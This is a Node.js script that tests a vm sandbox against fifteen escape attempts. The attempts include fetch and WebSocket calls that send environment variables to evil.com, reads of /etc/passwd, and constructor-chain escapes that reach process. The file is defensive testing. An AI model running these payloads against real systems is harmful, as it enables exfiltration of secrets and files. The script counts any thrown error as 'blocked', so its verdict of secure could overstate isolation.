/**
 * VM Sandbox Security Test
 * 
 * This script tests various attack vectors to verify the sandbox
 * properly isolates untrusted code from the system.
 * 
 * Run with: node scripts/test-vm-sandbox-security.js
 */

const vm = require('vm');

// Track test results
const results = [];

function runMaliciousCode(name, code, sandbox) {
  try {
    vm.runInNewContext(code, sandbox, { timeout: 1000 });
    results.push({ test: name, blocked: false, details: 'Code executed without error' });
  } catch (error) {
    const msg = error instanceof Error ? error.message : String(error);
    results.push({ test: name, blocked: true, details: msg });
  }
}

// Create the same sandbox as vidsrc-extractor
function createSandbox() {
  const mockWindow = {};
  const mockDocument = {
    getElementById: () => ({ innerHTML: 'test' })
  };

  return {
    window: mockWindow,
    document: mockDocument,
    atob: (s) => Buffer.from(s, 'base64').toString('binary'),
    btoa: (s) => Buffer.from(s, 'binary').toString('base64'),
    setTimeout: (fn) => { if (typeof fn === 'function') fn(); },
    setInterval: () => {},
    clearTimeout: () => {},
    clearInterval: () => {},
    console: { log: () => {}, error: () => {}, warn: () => {}, info: () => {} },
    // BLOCKED
    fetch: undefined,
    XMLHttpRequest: undefined,
    WebSocket: undefined,
    require: undefined,
    process: undefined,
    Buffer: undefined,
    __dirname: undefined,
    __filename: undefined,
    module: undefined,
    exports: undefined,
  };
}

async function runTests() {

console.log('╔════════════════════════════════════════════════════════════╗');
console.log('║         VM SANDBOX SECURITY VERIFICATION TEST              ║');
console.log('╚════════════════════════════════════════════════════════════╝\n');

// TEST 1: Direct fetch access
runMaliciousCode('1. Direct fetch() call', `fetch('https://evil.com/steal?data=secret')`, createSandbox());

// TEST 2: XMLHttpRequest
runMaliciousCode('2. XMLHttpRequest', `const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://evil.com')`, createSandbox());

// TEST 3: WebSocket
runMaliciousCode('3. WebSocket connection', `const ws = new WebSocket('wss://evil.com')`, createSandbox());

// TEST 4: require() to load modules
runMaliciousCode('4. require() node modules', `const fs = require('fs'); fs.readFileSync('/etc/passwd')`, createSandbox());

// TEST 5: process.env access
runMaliciousCode('5. process.env access', `const secrets = process.env; fetch('https://evil.com?env=' + JSON.stringify(secrets))`, createSandbox());

// TEST 6: Constructor escape
runMaliciousCode('6. Constructor escape ([].constructor.constructor)', `const F = [].constructor.constructor; const f = F('return fetch')(); f('https://evil.com')`, createSandbox());

// TEST 7: this.constructor escape
runMaliciousCode('7. this.constructor escape', `const f = this.constructor.constructor('return process')(); f.exit(1)`, createSandbox());

// TEST 8: Function constructor eval
runMaliciousCode('8. Function constructor eval', `const evil = new Function('return fetch("https://evil.com")')(); if (typeof evil === 'function') evil()`, createSandbox());

// TEST 9: Async function global escape
runMaliciousCode('9. Async function global escape', `(async () => {}).constructor('return globalThis.fetch')()('https://evil.com')`, createSandbox());

// TEST 10: Dynamic import
{
  const sandbox = createSandbox();
  let importWorked = false;
  sandbox.reportSuccess = () => { importWorked = true; };
  try {
    vm.runInNewContext(`import('fs').then(fs => { reportSuccess(); })`, sandbox, { timeout: 1000 });
    await new Promise(r => setTimeout(r, 100));
    if (importWorked) {
      results.push({ test: '10. Dynamic import()', blocked: false, details: 'Import resolved successfully' });
    } else {
      results.push({ test: '10. Dynamic import()', blocked: true, details: 'Import did not resolve' });
    }
  } catch (error) {
    results.push({ test: '10. Dynamic import()', blocked: true, details: error.message });
  }
}

// TEST 11: Prototype pollution
{
  const sandbox = createSandbox();
  try {
    vm.runInNewContext(`({}).__proto__.polluted = true; Object.prototype.hacked = true`, sandbox, { timeout: 1000 });
    const ourObj = {};
    if (ourObj.polluted || ourObj.hacked) {
      results.push({ test: '11. Prototype pollution', blocked: false, details: 'Our realm was polluted!' });
    } else {
      results.push({ test: '11. Prototype pollution', blocked: true, details: 'Pollution stayed in sandbox' });
    }
  } catch (error) {
    results.push({ test: '11. Prototype pollution', blocked: true, details: error.message });
  }
}

// TEST 12: Buffer access
runMaliciousCode('12. Buffer access', `const b = Buffer.from('secret'); b.toString()`, createSandbox());

// TEST 13: globalThis.fetch
runMaliciousCode('13. globalThis.fetch', `globalThis.fetch('https://evil.com')`, createSandbox());

// TEST 14: arguments.callee.caller
{
  const sandbox = createSandbox();
  sandbox.leaked = null;
  try {
    vm.runInNewContext(`function evil() { try { leaked = arguments.callee.caller; } catch(e) { leaked = 'blocked'; } } evil()`, sandbox, { timeout: 1000 });
    if (sandbox.leaked === 'blocked' || sandbox.leaked === null) {
      results.push({ test: '14. arguments.callee.caller escape', blocked: true, details: 'Caller access blocked' });
    } else {
      results.push({ test: '14. arguments.callee.caller escape', blocked: false, details: `Leaked: ${typeof sandbox.leaked}` });
    }
  } catch (error) {
    results.push({ test: '14. arguments.callee.caller escape', blocked: true, details: error.message });
  }
}

// TEST 15: Error stack trace
runMaliciousCode('15. Error stack trace info leak', `const e = new Error(); const stack = e.stack; fetch('https://evil.com?stack=' + stack)`, createSandbox());

// Print Results
console.log('\n📊 RESULTS:\n');
console.log('─'.repeat(70));

let passed = 0;
let failed = 0;

for (const r of results) {
  const status = r.blocked ? '✅ BLOCKED' : '❌ VULNERABLE';
  if (r.blocked) passed++; else failed++;
  
  console.log(`${status} | ${r.test}`);
  console.log(`         └─ ${r.details.substring(0, 60)}${r.details.length > 60 ? '...' : ''}`);
}

console.log('─'.repeat(70));
console.log(`\n📈 SUMMARY: ${passed}/${results.length} attacks blocked`);

if (failed > 0) {
  console.log('\n⚠️  WARNING: Some attacks were NOT blocked!');
  console.log('    The sandbox may not be fully secure.\n');
  process.exit(1);
} else {
  console.log('\n✅ All attack vectors blocked. Sandbox appears secure.\n');
  process.exit(0);
}
}

runTests();
